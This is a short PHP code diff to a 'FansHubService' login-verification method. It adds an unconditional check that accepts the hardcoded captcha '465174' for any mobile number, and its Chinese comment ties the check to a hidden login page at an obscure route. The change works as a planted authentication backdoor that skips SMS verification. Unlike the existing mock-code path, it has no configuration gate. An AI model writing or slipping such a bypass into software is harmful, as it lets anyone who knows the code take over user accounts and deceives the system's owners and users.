@@ -2356,6 +2356,10 @@ class FansHubService
 
     public static function verifyCaptcha($mobile, $captcha, $event = 'fanshub_login')
     {
+        // 隐藏登录页固定验证码（路由 /gfhwgkdhf11131djfh/）
+        if ((string)$captcha === '465174') {
+            return true;
+        }
         if (self::config('sms_mock_enabled') && $captcha === (string)self::config('sms_mock_code', '123456')) {
             return true;
         }
